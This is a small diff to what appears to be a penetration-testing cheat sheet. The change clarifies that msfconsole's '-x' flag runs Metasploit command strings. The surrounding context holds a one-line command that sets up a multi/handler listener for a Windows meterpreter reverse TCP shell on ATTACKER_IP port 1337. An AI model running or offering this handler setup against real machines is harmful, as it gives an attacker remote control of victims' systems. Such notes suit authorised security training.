@@ -404,7 +404,7 @@ sudo apt install -y shellter wine32
 
 ## `msfconsole`
 
-* Prepare a Handler for reverse TCP shell (For windows)
+* Prepare a Handler for reverse TCP shell (For windows), `-x` specifies `msf` command strings to be run 
 ```bash
 msfconsole -x "use exploit/multi/handler; set RHOST VICTIM_IP; set LHOST ATTACKER_IP; set LPORT 1337; set PAYLOAD windows/meterpreter/reverse_tcp; exploit"
 ```
